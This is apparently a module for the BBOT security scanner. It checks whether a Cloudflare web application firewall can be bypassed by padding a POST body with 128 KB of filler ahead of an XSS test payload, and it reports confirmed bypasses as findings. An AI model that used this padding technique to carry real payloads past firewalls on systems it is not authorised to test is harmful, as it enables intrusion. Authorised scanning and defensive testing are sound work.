from bbot.modules.base import BaseModule
from bbot.core.config.models import BaseModuleConfig, Field


class nowafpls(BaseModule):
    watched_events = ["URL"]
    produced_events = ["FINDING"]
    flags = ["active", "invasive", "web-heavy"]
    meta = {
        "description": "Detect Cloudflare WAF bypasses via HTTP body padding (nowafpls technique)",
        "created_date": "2026-07-14",
        "author": "@liquidsec",
    }

    class Config(BaseModuleConfig):
        padding_size: int = Field(
            131072,
            description="Size in bytes of the padding injected before the malicious payload",
        )
        payload: str = Field(
            "<script>alert(1)</script>",
            description="Malicious payload expected to trigger the WAF",
        )

    per_host_only = True
    in_scope_only = True

    async def filter_event(self, event):
        if "cloudflare" not in event.tags:
            return False, "target is not tagged as Cloudflare"
        return True

    async def handle_event(self, event):
        url = event.url
        payload = self.config.get("payload")
        padding_size = int(self.config.get("padding_size"))
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        encoded_payload = self.helpers.quote(payload)

        unpadded_body = f"q={encoded_payload}"
        unpadded = await self.helpers.request(
            url, method="POST", data=unpadded_body, headers=headers, allow_redirects=False
        )
        if not self._is_cf_block(unpadded):
            self.debug(f"Unpadded payload was not blocked at {url}, nothing to bypass")
            return

        padded_body = f"padding={'A' * padding_size}&q={encoded_payload}"
        padded = await self.helpers.request(
            url, method="POST", data=padded_body, headers=headers, allow_redirects=False
        )
        if self._is_cf_block(padded):
            self.debug(f"Padded payload still blocked at {url}, bypass failed")
            return

        await self.emit_event(
            {
                "host": str(event.host),
                "url": url,
                "severity": "LOW",
                "confidence": "CONFIRMED",
                "name": "WAF Bypass via Body Padding",
                "description": (
                    f"Cloudflare WAF bypassable via nowafpls-style body padding. "
                    f"Unpadded POST containing the malicious payload was blocked "
                    f"(status {unpadded.status_code}); the same payload preceded by "
                    f"{padding_size} bytes of padding reached the application "
                    f"(status {padded.status_code})."
                ),
            },
            "FINDING",
            parent=event,
            context=f"{{module}} bypassed the Cloudflare WAF at {url} via {padding_size}-byte body padding",
        )

    @staticmethod
    def _is_cf_block(response):
        if response is None:
            return False
        if "cf-mitigated" in response.headers:
            return True
        if response.status_code == 403:
            body = response.text or ""
            if "Attention Required" in body or "Cloudflare Ray ID" in body:
                return True
        return False
